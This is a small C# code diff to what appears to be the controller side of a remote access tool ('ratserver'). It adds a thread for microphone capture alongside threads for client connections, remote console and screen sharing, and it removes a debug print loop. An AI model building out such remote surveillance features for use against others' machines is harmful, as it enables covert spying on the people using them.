@@ -34,7 +34,7 @@ namespace ratserver
                 ShareScreen.form.Close();
                 Environment.Exit(0);
             };
-
+            new Thread(MicrophoneThread.Start).Start();
             new Thread(ServerFunctions.WaitForConnection).Start();
             new Thread(ConsoleThread.Start).Start();
             new Thread(ShareScreen.Start).Start();
@@ -53,10 +53,6 @@ namespace ratserver
         {
             Invoke(new Action(() => 
             {
-                foreach(var item in connectedClientsBox.Items)
-                {
-                    Console.WriteLine(item);
-                }
                 connectedClientsBox.Items.Remove(client.PCName);
                 if (connectedClientsBox.Items.Count != 0)
                     connectedClientsBox.SelectedIndex = 0;
